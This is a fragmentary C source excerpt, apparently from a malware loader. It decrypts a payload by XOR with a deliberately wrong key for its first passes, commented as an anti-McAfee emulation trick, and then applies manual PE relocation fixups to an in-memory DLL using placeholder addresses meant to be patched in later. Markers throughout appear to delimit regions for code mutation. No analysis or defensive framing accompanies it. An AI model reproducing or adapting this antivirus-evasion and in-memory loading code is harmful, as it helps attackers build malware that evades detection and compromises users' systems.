...
#pragma optimize(off)
	...
	DWORD dcount=0; //@S // ANTI-MCAFEE EMUL decrypt counter
...
done8:;
	...
	unsigned char *dll_text = (LPSTR)0xFDFDFDFD;      
	unsigned char *new_dll_text = (LPSTR)0xFBFBFBFB;    
	//@E

	dcount++;      // from dcount==finished iteration number
	if (dcount==2) 
		xorkey++;  // after 2nd interation - restore the correct xorkey

	if (dcount<3)
		goto dexor; // 1st iteration - xor with wrong xorkey
	...
	unsigned char *dll_data = (LPSTR)0xFAFAFAFA;     
	unsigned char *new_dll_data = (LPSTR)0xF8F8F8F8;              
	//@E
...
dloop3:; 
	...
	//---FIXUP sections
	DWORD dll_imagebase=0xF5F5F5F5;     
	FIXUP_BLOCK *fb=(LPVOID)0xF7F7F7F7; // 0xF7F7F7F7 == reloc_vadr
	//@E 

nextfb:;
	DWORD dll_text_rva=0xF3F3F3F3; //@S
	DWORD dll_data_rva=0xF2F2F2F2;
	unsigned char *b;              //@E


	// --- Process TypeOffset Entries (each entry==1 WORD) inside FixupBlock
	for (DWORD o=0;o<fb->BlockSize;o+=2)
	{
		b=new_dll_text-dll_text_rva;                        //@S // new dll imagebase vadr 
		wMEMORY *wmem=(LPVOID)(/*@S+*/o+8+(DWORD)fb/*@E*/); //@E
		WORD TypeOffset=wmem->word0;   

		if (/*@S==*/TypeOffset == 0/*@E*/) 
			break;      //@S // fixupblock end
		WORD Type   = TypeOffset>>12;                       // type of reloc
		WORD Offset = TypeOffset<<4; Offset=Offset>>4; //@E // offset since PageRVA

		if (/*@S&&*/(Offset == 0)&&(o != 0)/*@E*/)
			break;  //@S // fixupblock end
		DWORD delta=(DWORD)b-dll_imagebase;                //@E // 32bit delta
...
next:;
	...
	if ((DWORD)fb < 0xF4F4F4F4) 
		goto nextfb; //reloc_vadr + dll_fixupsize
